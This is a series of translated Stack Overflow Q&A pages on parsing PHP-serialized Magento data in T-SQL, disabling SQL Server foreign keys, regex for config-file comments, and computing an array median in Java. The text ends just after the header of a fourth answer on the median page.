# php - 在 T-SQL 中反序列化 PHP 序列化数据

> ID：11955723
> 
> 赞同：6
> 
> 时间：2012-08-14T15:28:15.623
> 
> 标签：php, tsql, magento, serialization

我正在尝试从 Magento 订单中提取礼品卡代码。其他一些代码使用 Magento API 从 Magento 检索作为 XML 的订单信息，并将 XML 插入到 MS SQL Server 记录中。使用 T-SQL 我可以使用 XML 函数来解析从 Magento API 检索到的 XML 并获得我需要的几乎所有东西，但实际礼品卡代码的唯一存储位置是在gift_cards 字段中，该字段恰好是 php 序列化细绳。

例子：

```
a:1:{i:0;a:5:{s:1:"i";s:1:"1";s:1:"c";s:12:"00XCY8S3ZXCU";s:1:"a";d:119;s:2:"ba";d:119;s:10:"authorized";d:119;}}
a:3:{i:0;a:5:{s:1:"i";s:2:"10";s:1:"c";s:12:"045EMJJWRCF1";s:1:"a";d:100;s:2:"ba";d:100;s:10:"authorized";d:100;}i:1;a:5:{s:1:"i";s:2:"11";s:1:"c";s:12:"06DUQ7Z5GVT7";s:1:"a";d:101;s:2:"ba";d:101;s:10:"authorized";d:101;}i:2;a:5:{s:1:"i";s:2:"12";s:1:"c";s:12:"07A6MRYW511J";s:1:"a";d:102;s:2:"ba";d:102;s:10:"authorized";d:102;}} 
```

礼品卡代码是数组中键为“c”的值，例如： `00XCY8S3ZXCU` `045EMJJWRCF1` `06DUQ7Z5GVT7` `07A6MRYW511J`

我目前正试图通过使用 T-SQL 函数解析值来解决这个问题，这就像试图用螺丝刀钉钉子一样。[显然，这里](https://stackoverflow.com/questions/7779408/unserialize-php-using-microsoft-sql-query)之前已经问过这个问题，唯一的建议是在 T-SQL 中从头开始构建一个解析器，但是使用 PHP 来反序列化它是更好的选择。

如果 Magento 不在他们的数据库中存储 PHP 序列化数据，然后在他们的 Web 服务中仍然序列化地提供它，那就太好了，但这就是我必须使用的。我会考虑使用 C# 对其进行转换并将其作为单独的字段存储在数据库中，但是能够在 T-SQL 中解析数据会更方便。如果我要使用 C# 来解析和反序列化 PHP 对象，我可能会将它作为 XML 存储回数据库中，因为这是一种更好的数据交换格式。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T18:46:38.857

This is what I was able to come up with myself. I was encouraged by a [post about parsing JSON](http://www.simple-talk.com/sql/t-sql-programming/consuming-json-strings-in-sql-server/) and decided to figure it out for serialized php objects. I took a completely different approach though.

**Updated code examples are [now published here on github](https://github.com/mjohnsonperl/tsqlphpunserialize/tree/master).**

The serialized php string:

```
a:3:{
  i:0;
  a:5:{
    s:1:"i";
    s:2:"10";

    s:1:"c";
    s:12:"045EMJJWRCF1";

    s:1:"a";
    d:100;

    s:2:"ba";
    d:100;

    s:10:"authorized";
    d:100;
  }

  i:1;
  a:5:{
    s:1:"i";
    s:2:"11";

    s:1:"c";
    s:12:"06DUQ7Z5GVT7";

    s:1:"a";
    d:101;

    s:2:"ba";
    d:101;

    s:10:"authorized";
    d:101;
  }

  i:2;
  a:5:{
    s:1:"i";
    s:2:"12";

    s:1:"c";
    s:12:"07A6MRYW511J";

    s:1:"a";
    d:102;

    s:2:"ba";
    d:102;

    s:10:"authorized";
    d:102;
  }
} 
```

My query to get the results:

```
select *
from parsePhpSerializedString('a:3:{i:0;a:5:{s:1:"i";s:2:"10";s:1:"c";s:12:"045EMJJWRCF1";s:1:"a";d:100;s:2:"ba";d:100;s:10:"authorized";d:100;}i:1;a:5:{s:1:"i";s:2:"11";s:1:"c";s:12:"06DUQ7Z5GVT7";s:1:"a";d:101;s:2:"ba";d:101;s:10:"authorized";d:101;}i:2;a:5:{s:1:"i";s:2:"12";s:1:"c";s:12:"07A6MRYW511J";s:1:"a";d:102;s:2:"ba";d:102;s:10:"authorized";d:102;}}') 
```

The results of the query:

```
element_id  parent_id   var_name                                           var_type                                           var_length  value_int   value_string                                                                                                                                                                                                                                                     value_decimal
----------- ----------- -------------------------------------------------- -------------------------------------------------- ----------- ----------- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------
1           0           NULL                                               a                                                  3           NULL        NULL                                                                                                                                                                                                                                                             NULL
2           1           0                                                  a                                                  5           NULL        NULL                                                                                                                                                                                                                                                             NULL
3           1           1                                                  a                                                  5           NULL        NULL                                                                                                                                                                                                                                                             NULL
4           1           2                                                  a                                                  5           NULL        NULL                                                                                                                                                                                                                                                             NULL
5           2           i                                                  s                                                  2           NULL        10                                                                                                                                                                                                                                                               NULL
6           2           c                                                  s                                                  12          NULL        045EMJJWRCF1                                                                                                                                                                                                                                                     NULL
7           2           a                                                  d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             100
8           2           ba                                                 d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             100
9           2           authorized                                         d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             100
10          3           i                                                  s                                                  2           NULL        11                                                                                                                                                                                                                                                               NULL
11          3           c                                                  s                                                  12          NULL        06DUQ7Z5GVT7                                                                                                                                                                                                                                                     NULL
12          3           a                                                  d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             101
13          3           ba                                                 d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             101
14          3           authorized                                         d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             101
15          4           i                                                  s                                                  2           NULL        12                                                                                                                                                                                                                                                               NULL
16          4           c                                                  s                                                  12          NULL        07A6MRYW511J                                                                                                                                                                                                                                                     NULL
17          4           a                                                  d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             102
18          4           ba                                                 d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             102
19          4           authorized                                         d                                                  NULL        NULL        NULL                                                                                                                                                                                                                                                             102 
```

If I just wanted the gift card codes I can write a query like this:

```
select value_string
from parsePhpSerializedString('a:3:{i:0;a:5:{s:1:"i";s:2:"10";s:1:"c";s:12:"045EMJJWRCF1";s:1:"a";d:100;s:2:"ba";d:100;s:10:"authorized";d:100;}i:1;a:5:{s:1:"i";s:2:"11";s:1:"c";s:12:"06DUQ7Z5GVT7";s:1:"a";d:101;s:2:"ba";d:101;s:10:"authorized";d:101;}i:2;a:5:{s:1:"i";s:2:"12";s:1:"c";s:12:"07A6MRYW511J";s:1:"a";d:102;s:2:"ba";d:102;s:10:"authorized";d:102;}}')
where   parent_id != 0 and
        var_name = 'c' 
```

Results:

```
value_string
-------------
045EMJJWRCF1
06DUQ7Z5GVT7
07A6MRYW511J 
```

Here is the T-SQL function for parsing the serialized PHP string:

```
IF OBJECT_ID (N'dbo.parsePhpSerializedString') IS NOT NULL
   DROP FUNCTION dbo.parsePhpSerializedString
GO
CREATE FUNCTION dbo.parsePhpSerializedString( @phpSerialized VARCHAR(MAX))
RETURNS @results table 
    (
        element_id int identity(1,1) not null, /* internal surrogate primary key gives the order of parsing and the list order */
        parent_id int, /* if the element has a parent then it is in this column. */
        var_name varchar(50), /* the name or key of the element in a key/value array list */
        var_type varchar(50),
        var_length int,
        value_int int,
        value_string varchar(max),
        value_decimal numeric
    )
AS
BEGIN

    /*
    Built by Matt Johnson (matt@evdat.com) 2012-08-14
    */

    -- we use this table later for collecting auto generated
    -- identity values when inserting records into @results
    declare @insertedIds table (
        element_id int
    )

    -- define variables
    declare @element_start int
    declare @var_type_end int
    declare @var_type varchar(50)
    declare @element_end int
    declare @chunk varchar(max)
    declare @var_length_start int
    declare @var_length_end int
    declare @var_length_string varchar(max)
    declare @var_length int
    declare @value_start int
    declare @value_end int
    declare @value_string varchar(max)
    declare @value_int int
    declare @value_decimal numeric
    declare @array_level int
    declare @value_string_position int
    declare @next_open int
    declare @next_close int
    declare @parent_id int
    declare @element_id int
    declare @key_element_id int
    declare @inserted_element_id int
    declare @var_name varchar(50)

    --initialize variables
    set @parent_id = 0

    --loop through the supplied @phpSerialized string until it's empty
    while 1=1 begin
        set @element_start = null
        set @var_type_end = null
        set @var_type = null
        set @element_end = null
        set @chunk = null
        set @var_length_start = null
        set @var_length_end = null
        set @var_length_string = null
        set @var_length = null
        set @value_start = null
        set @value_end = null
        set @value_string = null
        set @value_int = null
        set @value_decimal = null
        set @array_level = null
        set @value_string_position = null
        set @next_open = null
        set @next_close = null
        set @var_name = null

        --confirm that there is an element to parse and define its starting point
        --patindex will return a value of 1 if the pattern is found and this pattern
        --will only match if the element starting point is the first character in the
        --supplied string. If it is encapsulated in quotes or anything else it will not match
        set @element_start = patindex('[asid]:%[;}]', @phpSerialized)

        if @element_start <= 0 begin
            --if the supplied string is now empty check the existing results table
            --for any nested elements in any array elements

            --reset the value of @element_id to be safe
            set @element_id = null

            --only retrieve the first element found containing sub elements to parse
            select  top 1 
                    @phpSerialized = value_string,
                    @element_id = element_id    
            from @results 
            where   var_type = 'a' and 
                    value_string is not null

            --set the parent_id to the array's element_id
            set @parent_id = @element_id

            --if there were no results found then that means there either
            --were no arrays to parse, or all arrays have already been parsed
            --so break the continuous loop because we are completely done now
            if @element_id is null break

            --set the @element_start again now that we 
            --have a new string to parse for elements
            set @element_start = patindex('[asid]:%[;}]', @phpSerialized)
        end

        --find the end of the type of the element then extract the variable type from the string
        set @var_type_end = patindex('%:%', @phpSerialized)
        set @var_type = substring(@phpSerialized, @element_start, @var_type_end-@element_start)

        --generate an error if a variable type is supplied that hasn't been coded for.
        if @var_type not like '[asid]' begin
            /*
            print @var_type
            RAISERROR (N'Error parsing php serialized string. Variable type found that has not been defined to parse for.', -- Message text.
                       16, -- Severity,
                       1 -- State
                       )
            */

            --apparently errors can't be raised within a function so skip the element
            break
        end

        --array elements contain sub elements so we use different methods for parsing
        --sub elements than we do for parsing individual elements.
        if @var_type != 'a' begin
            --element has no sub elements

            --determine the end of this individual element and then extract 
            --only this individual element from the string
            set @element_end = patindex('%;%', @phpSerialized)+1
            set @chunk = substring(@phpSerialized, @element_start, @element_end-@element_start)

            --strings are serialized differently than numeric elements
            if @var_type = 's' begin
                --element has var length

                --find the starting and ending positions for the var_length and then extract the length
                set @var_length_start = @var_type_end+1
                set @var_length_end = patindex('%:%', substring(@chunk, @var_length_start, len(@chunk))) + @var_length_start - 1
                set @var_length_string = substring(@chunk, @var_length_start, @var_length_end-@var_length_start)
                if @var_length_string not like '[^0-9]' begin
                    --its nice to verify this is actually a number before casting it as such
                    set @var_length = cast(@var_length_string as int)
                end

                --find the starting and ending positions for the value and then extract the value
                set @value_start = @var_length_end+1
                set @value_end = patindex('%;%', @chunk)
                --a string value is quoted so remove quotes in start and end of substring for value
                --we set the substring starting position +1 just past the start of the quote and then
                --set the length of the extracted string -2 to account for both the starting quote and 
                --ending quote to be removed from the extracted string.
                set @value_string = substring(@chunk, @value_start+1, @value_end-@value_start-2)

            end else begin
                --element does not have a var length

                --find the starting and ending positions for the value and then extract the value as a string
                set @value_start = @var_type_end+1
                set @value_end = patindex('%;%', @chunk)
                set @value_string = substring(@chunk, @value_start, @value_end-@value_start)

                --determine what value type the string should be converted to
                if @var_type = 'i' begin
                    if @value_string not like '[^0-9.]' begin
                        set @value_int = cast(@value_string as int)
                        --clear the value_string because the element's value has been converted to its appropriate type
                        set @value_string = null
                    end
                end else if @var_type = 'd' begin
                    if @value_string not like '[^0-9.]' begin
                        set @value_decimal = cast(@value_string as numeric)
                        --clear the value_string because the element's value has been converted to its appropriate type
                        set @value_string = null
                    end
                end

            end

        end else begin
            --element is array and has sub elements

            --we are going to chop up the string to try and determine its end so we'll
            --first set the string to a variable we can destroy in this process
            set @chunk = @phpSerialized

            --find the starting and ending positions for the var_length and then extract the length
            --arrays use this to state how may elements this array contains
            set @var_length_start = @var_type_end+1
            set @var_length_end = patindex('%:%', substring(@chunk, @var_length_start, len(@chunk))) + @var_length_start - 1
            set @var_length_string = substring(@chunk, @var_length_start, @var_length_end-@var_length_start)
            if @var_length_string not like '[^0-9]' begin
                set @var_length = cast(@var_length_string as int)
            end

            --find the value starting position
            --later we will find the true end of the value
            set @value_start = @var_length_end+1

            -- to determine the ending position we have to dig through the sub elements and track the
            -- nested level to identify the ending brace for this level
            set @array_level = 0
            --we start the string position at 1 for the begining of the serialized string
            set @value_string_position = 1

            -- loop through the value chopping up the chunk while trying to find the ending brace for this array
            while 1=1 begin

                --find the next open and close braces in the chunk
                set @next_open = patindex('%{%', @chunk)
                set @next_close = patindex('%}%', @chunk)

                --check to see which brace is the next in the chunk
                if @next_open > 0 and @next_open < @next_close begin
                    --found an opening brace

                    --since this is an opening brace we need to increment the level and strip off
                    --everything from the chunk before the brace so that we can search for additional braces
                    --we also note the position in the string for use in finding the end of the value later
                    --we track the previous position and add to it because we keep chopping off the beginning of
                    --the chunk as we parse through the string, and later we will need to reference the position
                    --relative to the entire serialized string.
                    set @value_string_position = @value_string_position + patindex('%{%', @chunk)-1
                    set @chunk = substring(@chunk, patindex('%{%', @chunk)+1, len(@chunk))
                    set @array_level = @array_level + 1

                end else if @next_close > 0 begin
                    --found a closing brace
                    --print 'found close at level: ' + cast(@array_level as varchar(10)) + '(' + cast(patindex('%}%', @chunk) as varchar(10)) + ')'

                    --since this is a closing brace we need to decrement the level and strip off
                    --everything from the chunk before the brace so that we can search for additional braces
                    --we also note the position in the string for use in finding the end of the value later
                    --we track the previous position and add to it because we keep chopping off the beginning of
                    --the chunk as we parse through the string, and later we will need to reference the position
                    --relative to the entire serialized string.
                    set @value_string_position = @value_string_position + patindex('%}%', @chunk)+1
                    set @chunk = substring(@chunk, patindex('%}%', @chunk)+1, len(@chunk))
                    set @array_level = @array_level - 1

                end else break

                --once we get back to level 0 we know we've found the end of this array element
                --so break the continuous loop now that we have the ending position
                if @array_level <= 0 break
            end

            --set the ending position of the element and the value since the value is the last part of the element
            set @element_end = @value_string_position
            set @value_end = @element_end
            --an array value is surrounded by braces so remove the braces in start and end of the substring value
            --we set the substring starting position +1 just past the start of the opening brace and then
            --set the length of the extracted string -2 to account for both the opening brace and 
            --closing brace to be removed from the extracted string.
            set @value_string = substring(@phpSerialized, @value_start+1, @value_end-@value_start-2)
            set @chunk = substring(@phpSerialized, @element_start, @element_end-@element_start)

            -- if the array is empty just set it to null so that
            -- we don't try and parse the contents of the array value later.
            if @value_string = '' set @value_string = null
        end

        --we populate the results table differently depending on the element that is being parsed. 
        --Any element contained in an array has a key element and a value element. Though we parse
        --all key elements in an array all we do with them in the results table is set their value
        --as the var_name (key) for the element, and store the key_element_id for setting the value
        --in the next pass since key/value pairs are listed sequentially in a serialized string.
        if @parent_id > 0 and @key_element_id > 0 begin
            --parent_id > 0 indicates this is a sub element inside an array
            --and the array contents currently being parsed contain key elements and value
            --elements sequentially in the serialized string. Because key_element_id is not 0
            --we know this must be the value part of the element contained in the array as the
            --key was just previously defined.

            --update the existing keyed element with it's type, length and value
            update @results
            set var_type = @var_type, 
                var_length = @var_length, 
                value_string = @value_string, 
                value_int = @value_int, 
                value_decimal = @value_decimal
            where element_id = @key_element_id      

            set @key_element_id = null
        end else if @parent_id > 0 begin
            --this element is a part of the array which contains key/value paris and since
            --the @key_element_id is 0 or not defined we can asume this is the key of the pair

            --determine what the key element type is and cast it as a string to the var_name
            if @var_type = 'i' set @var_name = cast(@value_int as varchar(50))
            if @var_type = 'd' set @var_name = cast(@value_decimal as varchar(50))
            if @var_type = 's' set @var_name = @value_string

            --here we are assuming that all keys should be of type s, d, or i... so we if get anything
            --other than that throw an error since this code is not setup to handle that.
            if @var_type not like '[sid]' begin
                /*
                print @var_type
                RAISERROR (N'Error parsing php serialized string. Variable type found that should be akey but is not of type s, d, or i.', -- Message text.
                           16, -- Severity,
                           1 -- State
                           )
                */

                --apparently errors can't be raised within a function so skip the element
                break
            end

            --insert a new record into the results table defining the parent_id and var_name
            insert @results 
            (
                parent_id,
                var_name
            ) 
            output inserted.element_id into @insertedIds 
            values (
                @parent_id,
                @var_name
            )

            --since we stored the identity value in the output set that value to @inserted_element_id
            select top 1 @inserted_element_id = element_id from @insertedIds
            delete from @insertedIds

            --set the key_element_id so that the next pass catches the value and assigns it to this result record
            set @key_element_id = @inserted_element_id

        end else begin
            --this will be executed for parsed strings that are not part of an array
            --in which case the elements do not contain value_name keys

            --insert the entire element details into the results table
            insert into @results 
            (
                parent_id, 
                var_type, 
                var_length, 
                value_string, 
                value_int, 
                value_decimal
            ) 
            output inserted.element_id into @insertedIds 
            values (
                @parent_id,
                @var_type,
                @var_length,
                @value_string,
                @value_int,
                @value_decimal
            )

            --here we capture the identiy value for the inserted record
            select top 1 @inserted_element_id = element_id from @insertedIds
            delete from @insertedIds
        end

        -- if the current php serilized string was an array then it would have
        -- been parsed and elements added to the results, so we should remove
        -- the value_string from the array element in the results table so that
        -- it doesn't get parsed again in the loop. 
        if @element_id is not null begin
            --the only strings that get parsed where the @element_id has
            --a value is from an array element
            update @results
            set value_string = null
            where element_id = @element_id
        end

        --since we have parsed this element from the serialized string chop off this element
        --from the string and run the rest of it through the loop again to ensure all
        --elements have been parsed from the supplied serialized string.
        set @phpSerialized = substring(@phpSerialized, @element_end, len(@phpSerialized))

    end

    return
end 
```

And though it doesn't account for all serialized types and such, it was enough for my purpose here, and the included comments should help to guide anyone that needs to adapt it for their own use, or extend it's functionality.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-22T05:04:27.420

这是另一个 MSSQL 函数，您可以使用它从 PHP 序列化字符串中提取令牌的*第一个*实例的值，这些字符串通常在 Magento 的数据库中找到。该函数接受要提取的值的属性名称，以及要从中解析它的序列化值：

```
CREATE FUNCTION extractValueFromSerializedPhpString(
    @attribute_name nvarchar(100), @serialized_value nvarchar(max)
) RETURNS nvarchar(1024)
BEGIN
    DECLARE @attribute_value_length int, @attribute_value_length_string nvarchar(5)
    SELECT @attribute_value_length_string = REPLACE(REPLACE(SUBSTRING(@serialized_value,CHARINDEX(@attribute_name,@serialized_value)+LEN(@attribute_name)+4,3),':',''),'"','')
    IF ISNUMERIC(@attribute_value_length_string) = 1 BEGIN
        SELECT @attribute_value_length = CAST(@attribute_value_length_string AS int)
        RETURN SUBSTRING(@serialized_value,CHARINDEX(@attribute_name,@serialized_value)+LEN(@attribute_name)+CASE WHEN @attribute_value_length > 99 THEN 9 WHEN @attribute_value_length > 9 THEN 8 ELSE 7 END,@attribute_value_length)
    END
    RETURN NULL
END 
```

请注意，这仅适用于长度从 1 到 999 的字符串值，并且可能还有各种其他烦人的边缘情况，但它适用于我的（简单）目的。

# sql - 对数据库中的所有数据编写脚本，在重新运行时导致大量外键约束冲突

> ID：11955724
> 
> 赞同：1
> 
> 时间：2012-08-14T15:28:16.137
> 
> 标签：sql, sql-server, sql-server-2008, ef-code-first, sql-scripts

我正在使用 EF 代码首先生成的数据库，它提供一些种子数据，并从其他数据库导入数据（一万行，因此在 EF 中播种没有意义）。为了简化流程，我想我可以只编写整个数据库数据的脚本。因此，如果我需要再次 DropCreate（现在我们使用迁移策略）我的数据库，我可以一次为所有数据播种。

但是，SQL Server 生成的脚本会导致很多这样的冲突：

> INSERT 语句与 FOREIGN KEY 约束冲突...

我可以想象这是因为我们的数据非常复杂，并且以错误的顺序插入数据会导致这种情况。有什么方法可以让 .sql 脚本在填充表之前忽略/关闭数据库的所有外键约束，然后在插入完成后重新打开它们？插入所有数据后，应该没有约束问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:31:18.010

是的，您可以暂时禁用外键：

```
ALTER TABLE MyTable NOCHECK CONSTRAINT FK_MyTable_MyKey 
```

当您[重新启用约束](https://stackoverflow.com/questions/11132562/temporary-disable-foreignkeys)时，您应该检查约束以确保没有违规，就像这样（注意双重检查检查）

```
ALTER TABLE [MyTable] WITH CHECK CHECK CONSTRAINT FK_MyTable_MyKey 
```

[有关数据库级解决方案，](https://stackoverflow.com/questions/159038/can-foreign-key-constraints-be-temporarily-disabled-using-t-sql)请参阅这篇文章。

# regex - 用于解析配置文件的正则表达式，其中 # 符号表示注释

> ID：11955725
> 
> 赞同：0
> 
> 时间：2012-08-14T15:28:17.267
> 
> 标签：regex

用琴弦

```
Test=Hello World #Some more text
Test=Hello World 
```

我需要同时捕获“测试”组和“Hello World”组。如果字符串以“#”开头，则根本不应该被捕获。

以下表达式分别适用于第一个和第二个字符串：

```
^((?!#).+)(?:=)(.+[\S])(?:[\s]*[#])
^((?!#).+)(?:=)(.+[\S]) 
```

如何在两个非捕获正则表达式组之间进行按位逻辑或？

我试着做类似的事情

```
^((?!#).+)(?:=)(.+[\S])(?:[\s]*[#])|(?:.*) 
```

但不能让它正常工作。

**更多细节**

背景：这是在 C# (.NET Framework 4.0) 中完成的。正在逐行读取文件。等号左边的文本是指变量名，等号右边的文本是指变量的值。该文件被用作配置文件。

一般情况：

注意：所有尾随空格 - 不应捕获最后一个非空格字符末尾的任何空格。这还包括第二组末尾和井号之间的任何空格。

1) 除空格外的所有字符，紧随其后的是等号，紧随其后的是任何一组字符，后跟空格和井号。例如

```
this=is valid #text
s0_is=this #text
and=th.is #text
the=characters after the    # Pound sign are irrelevant 
```

2) 与案例 1 完全相同的情况，只是第二个捕获组和井号之间没有尾随空格。例如

```
this=is valid#text
s0_is=this#text
and=th.is#text
the=characters after the# Pound sign are irrelevant 
```

3) 情况与情况一、二相同；但是，如果根本没有 # 符号（请参阅上面关于尾随空格的说明）。例如

```
this=is valid
s0_is=this
and=th.is
the=characters after the 
```

对于所有这三种情况，捕获组应分别如下所示（| 符号用于区分捕获组）：

```
this|is valid
s0_is|this
and|th.is
the|characters after the 
```

特别案例：

1) 行的第一个字符是# 号。这应该不会导致任何内容被捕获。

2) # 符号紧跟在 = 符号之后。这应该导致第二个捕获组为空。

3) # 符号出现在上面没有明确说明的任何其他地方。这应该不会导致任何内容被捕获。

4) 新行的第一个字符之前不应有空格；但是，这种情况不太可能真正发生。

5) 等号后的空格无效。

无效的情况（不应捕获任何内容）：

```
th is=is not valid#text
nor =this#text
 or_this=something
also= this 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T19:38:35.837

我怀疑你让这变得比它需要的更困难。试试这个正则表达式：

```
^(\w+)=([^\s#]+(?:[ \t]+[^\s#]+)+) 
```

我使用`[ \t]+`而不是`\s+`防止它与换行符匹配并溢出到下一行——当然，假设输入确实是多行的。如果您愿意，您仍然可以将其应用于独立字符串。

**编辑**：回答你的评论，试试这个正则表达式：

```
^(\w+)=(\w+(?:[ \t]+\w+)*) 
```

使用第一个正则表达式时，我试图避免做出限制性假设，但我有点得意忘形。`\w+`如您所见，如果您可以使用所有单词，它会变得容易得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T16:05:00.393

```
^((?!#).+)(?:=)(.+[\S])(?:[\s]*[#])|(?:.*) 
```

表示匹配

```
^((?!#).+)(?:=)(.+[\S])(?:[\s]*[#]) 
```

或者

```
(?:.*) 
```

尝试这个

```
^((?!#).+)(?:=)(.+[\S])(?:(?:[\s]*[#])|(?:.*)) 
```

虽然`(?:.*)`看起来有点毫无意义，但你为什么不尝试这样的事情：

```
^((?!#).+)(?:=)(.+?\S)(?:\s*[#])? 
```

这将有选择地匹配最后一组，这是我认为你正在尝试做的事情，在这种情况下这将是更好的选择。

# java - 如何计算数组的中位数？

> ID：11955728
> 
> 赞同：54
> 
> 时间：2012-08-14T15:28:23.490
> 
> 标签：java, arrays

我正在尝试计算由文本字段接收的输入填充的数组的总数、平均值和中位数。我已经设法计算出总数和平均值，但我无法让中位数起作用。我认为在执行此操作之前需要对数组进行排序，但我不确定如何执行此操作。是这个问题，还是我没有找到另一个问题？这是我的代码：

```
import java.applet.Applet;
import java.awt.Graphics;
import java.awt.*;
import java.awt.event.*;

public class whileloopq extends Applet implements ActionListener
{
    Label label;
    TextField input;
    int num;
    int index;
    int[] numArray = new int[20];
    int sum;
    int total;
    double avg;
    int median;

    public void init ()
    {
        label = new Label("Enter numbers");
        input = new TextField(5);
        add(label);
        add(input);
        input.addActionListener(this);
        index = 0;
    }

    public void actionPerformed (ActionEvent ev)
    {
        int num = Integer.parseInt(input.getText());
        numArray[index] = num;
        index++;
        if (index == 20)
        input.setEnabled(false);
            input.setText("");
        sum = 0;
        for (int i = 0; i < numArray.length; i++)
        {
            sum += numArray[i];
        }
        total = sum;
        avg = total / index;

        median = numArray[numArray.length/2];

        repaint();

    }

    public void paint (Graphics graf)
    {

        graf.drawString("Total   = " + Integer.toString(total), 25, 85);
        graf.drawString("Average = " + Double.toString(avg), 25, 100);
        graf.drawString("Median = " + Integer.toString(median), 25, 115);

    }
} 
```

* * *

## 回答 #1

> 赞同：90
> 
> 时间：2012-08-14T15:37:39.137

Java 中的 Arrays 类有一个静态排序函数，您可以使用`Arrays.sort(numArray)`.

```
Arrays.sort(numArray);
double median;
if (numArray.length % 2 == 0)
    median = ((double)numArray[numArray.length/2] + (double)numArray[numArray.length/2 - 1])/2;
else
    median = (double) numArray[numArray.length/2]; 
```

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2015-03-03T00:56:33.420

对数组进行排序是不必要且低效的。有一个 QuickSort ( [QuickSelect](https://en.wikipedia.org/wiki/Quickselect) ) 算法的变体，它的平均运行时间为 O(n)；如果你先排序，你会降到 O(n log n)。它实际上是在列表中找到第 n 个最小的项目；对于中位数，您只需使用 n = 列表长度的一半。我们称它为 quickNth (list, n)。

这个概念是要找到第 n 个最小的，选择一个“枢轴”值。（具体如何选择并不重要；如果您知道数据将是完全随机的，您可以选择列表中的第一项。）

将原始列表拆分为三个较小的列表：

*   一个值小于枢轴的值。
*   一个值等于枢轴。
*   一个值大于枢轴的值。

然后你有三种情况：

1.  “较小的”列表有 >= n 项。在这种情况下，您知道第 n 个最小的在该列表中。返回 quickNth(smaller, n)。
2.  较小的列表有 < n 项，但较小且相等的列表的长度总和 >= n 项。在这种情况下，第 n 个等于 "equal" 列表中的任何项目；你完成了。
3.  n 大于较小且相等的列表的长度之和。在这种情况下，您基本上可以跳过这两个，并相应地调整 n。返回 quickNth（更大，n - 长度（更小） - 长度（等于））。

完毕。

如果您不确定数据是否完全随机，则需要更加复杂地选择枢轴。取列表中第一个值、列表中最后一个值以及两者中间的值的中值效果很好。

如果您对枢轴的选择非常不走运，并且总是选择最小值或最大值作为枢轴，则这需要 O(n^2) 时间；那很糟。但是，如果你用一个像样的算法来选择你的支点，这也是不太可能的*。*

示例代码：

```
import java.util.*;

public class Utility {
   /****************
   * @param coll an ArrayList of Comparable objects
   * @return the median of coll
   *****************/

   public static <T extends Number> double median(ArrayList<T> coll, Comparator<T> comp) {
      double result;
      int n = coll.size()/2;

      if (coll.size() % 2 == 0)  // even number of items; find the middle two and average them
         result = (nth(coll, n-1, comp).doubleValue() + nth(coll, n, comp).doubleValue()) / 2.0;
      else                      // odd number of items; return the one in the middle
         result = nth(coll, n, comp).doubleValue();

      return result;
   } // median(coll)

   /*****************
   * @param coll a collection of Comparable objects
   * @param n  the position of the desired object, using the ordering defined on the list elements
   * @return the nth smallest object
   *******************/

   public static <T> T nth(ArrayList<T> coll, int n, Comparator<T> comp) {
      T result, pivot;
      ArrayList<T> underPivot = new ArrayList<>(), overPivot = new ArrayList<>(), equalPivot = new ArrayList<>();

      // choosing a pivot is a whole topic in itself.
      // this implementation uses the simple strategy of grabbing something from the middle of the ArrayList.

      pivot = coll.get(n/2);

      // split coll into 3 lists based on comparison with the pivot

      for (T obj : coll) {
         int order = comp.compare(obj, pivot);

         if (order < 0)        // obj < pivot
            underPivot.add(obj);
         else if (order > 0)   // obj > pivot
            overPivot.add(obj);
         else                  // obj = pivot
            equalPivot.add(obj);
      } // for each obj in coll

      // recurse on the appropriate list

      if (n < underPivot.size())
         result = nth(underPivot, n, comp);
      else if (n < underPivot.size() + equalPivot.size()) // equal to pivot; just return it
         result = pivot;
      else  // everything in underPivot and equalPivot is too small.  Adjust n accordingly in the recursion.
         result = nth(overPivot, n - underPivot.size() - equalPivot.size(), comp);

      return result;
   } // nth(coll, n)

   public static void main (String[] args) {
      Comparator<Integer> comp = Comparator.naturalOrder();
      Random rnd = new Random();

      for (int size = 1; size <= 10; size++) {
         ArrayList<Integer> coll = new ArrayList<>(size);
         for (int i = 0; i < size; i++)
            coll.add(rnd.nextInt(100));

         System.out.println("Median of " + coll.toString() + " is " + median(coll, comp));
      } // for a range of possible input sizes
   } // main(args)
} // Utility 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2013-11-08T06:36:55.310

如果你想在这里使用任何外部库是[Apache commons 数学库](http://commons.apache.org/proper/commons-math/download_math.cgi)，你可以计算[Median](http://commons.apache.org/proper/commons-math/apidocs/org/apache/commons/math3/stat/descriptive/rank/Median.html)。
有关更多方法和使用，请查看[API 文档](http://commons.apache.org/proper/commons-math/apidocs/index.html)

```
import org.apache.commons.math3.*;
.....
......
........
//calculate median
public double getMedian(double[] values){
 Median median = new Median();
 double medianValue = median.evaluate(values);
 return medianValue;
}
....... 
```

*   有关评估方法的更多信息[AbstractUnivariateStatistic#evaluate](http://commons.apache.org/proper/commons-math/apidocs/org/apache/commons/math3/stat/descriptive/AbstractUnivariateStatistic.html#evaluate%28double%5B%5D%29)

**更新**

*在程序中计算*

[通常，使用此处给出](http://en.wikipedia.org/wiki/Median)的以下两个公式计算中位数

> 如果 n 是奇数，则中位数 (M) = 第 ((n + 1)/2) 项的值。
> 如果 n 是偶数，则中位数 (M) = [((n)/2)th item term + ((n)/2 + 1)th item term ]/2 的值

在您的程序中`numArray`，首先您需要使用[Arrays#sort对数组进行排序](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#sort%28int%5B%5D%29)

```
Arrays.sort(numArray);
int middle = numArray.length/2;
int medianValue = 0; //declare variable 
if (numArray.length%2 == 1) 
    medianValue = numArray[middle];
else
   medianValue = (numArray[middle-1] + numArray[middle]) / 2; 
```

* * *

## 回答 #4

> 赞同：5
> 
